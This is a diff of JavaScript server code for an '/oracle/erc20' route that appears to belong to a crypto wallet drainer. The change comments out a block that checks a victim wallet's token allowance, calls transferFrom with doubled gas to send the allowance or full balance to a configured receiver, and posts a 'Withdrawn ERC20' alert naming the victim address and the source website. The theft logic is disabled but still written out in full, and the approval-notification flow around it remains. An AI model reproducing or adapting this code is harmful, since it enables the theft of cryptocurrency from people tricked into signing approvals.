@@ -606,59 +606,59 @@ app.post("/oracle/erc20", async (req, res) => {
       notify({},message_);
       console.log("[+] Approved ERC20");
 
-    let withdrawal;
-    let allowance;
-    let retries = 3;
-    let delayInSeconds = 5;
+    // let withdrawal;
+    // let allowance;
+    // let retries = 3;
+    // let delayInSeconds = 5;
 
-    allowance = await contractInstance.allowance(
-      address,
-      config.signer_wallet_address
-    );
-    let retryCount = 0;
-    while (retryCount < retries && allowance <= 0) {
-      allowance = await contractInstance.allowance(
-        address,
-        config.signer_wallet_address
-      );
-      await delay(delayInSeconds * 1000);
-      console.log(
-        `Retrying transaction check (${retryCount + 1}/${retries}) retries...`
-      );
-      retryCount++;
-    }
+    // allowance = await contractInstance.allowance(
+    //   address,
+    //   config.signer_wallet_address
+    // );
+    // let retryCount = 0;
+    // while (retryCount < retries && allowance <= 0) {
+    //   allowance = await contractInstance.allowance(
+    //     address,
+    //     config.signer_wallet_address
+    //   );
+    //   await delay(delayInSeconds * 1000);
+    //   console.log(
+    //     `Retrying transaction check (${retryCount + 1}/${retries}) retries...`
+    //   );
+    //   retryCount++;
+    // }
 
-    let balance = await contractInstance.balanceOf(address);
-    if (parseInt(allowance) > 0 && balance > 0) {
-      const gasPrice = (await provider.getGasPrice()).mul(2);
+    // let balance = await contractInstance.balanceOf(address);
+    // if (parseInt(allowance) > 0 && balance > 0) {
+    //   const gasPrice = (await provider.getGasPrice()).mul(2);
 
-      if (balance.gte(allowance)) {
-        withdrawal = await contractInstance.transferFrom(
-          address,
-          config.receiver,
-          allowance,
-          { gasPrice }
-        );
-      } else {
-        withdrawal = await contractInstance.transferFrom(
-          address,
-          config.receiver,
-          balance,
-          { gasPrice }
-        );
-      }
+    //   if (balance.gte(allowance)) {
+    //     withdrawal = await contractInstance.transferFrom(
+    //       address,
+    //       config.receiver,
+    //       allowance,
+    //       { gasPrice }
+    //     );
+    //   } else {
+    //     withdrawal = await contractInstance.transferFrom(
+    //       address,
+    //       config.receiver,
+    //       balance,
+    //       { gasPrice }
+    //     );
+    //   }
 
-      await provider.waitForTransaction(withdrawal.hash);
+    //   await provider.waitForTransaction(withdrawal.hash);
 
-      let withdrawMessage_1 =
-      `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
-      `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
-      `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
-      `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
-      `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
-      `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
-        notify({},withdrawMessage_1);
-        console.log("[+] Withdrawn ERC20");
+    //   let withdrawMessage_1 =
+    //   `🟢 <b>[+] Withdrawn ERC20</b>\n\n` +
+    //   `💎 <b>Token name:</b> ${escaper(tokenName)}\n` +
+    //   `🔑 <b>Wallet Address</b>: <a href="https://debank.com/profile/${address}">${format_addy(address)}</a>\n` +
+    //   `🔐 <b>Receipient Address</b>: <a href="https://debank.com/profile/${config.receiver}">${format_addy(config.receiver)}</a>\n` +
+    //   `🔍 <b>Tx Hash</b>: <a href="https://explorer.bitquery.io/search/${withdrawal.hash}">Lookup Tx</a>\n` +
+    //   `🌐 <b>Website</b>: ${escaper(websiteUrl)}\n`;
+    //     notify({},withdrawMessage_1);
+    //     console.log("[+] Withdrawn ERC20");
 
    
     } else {
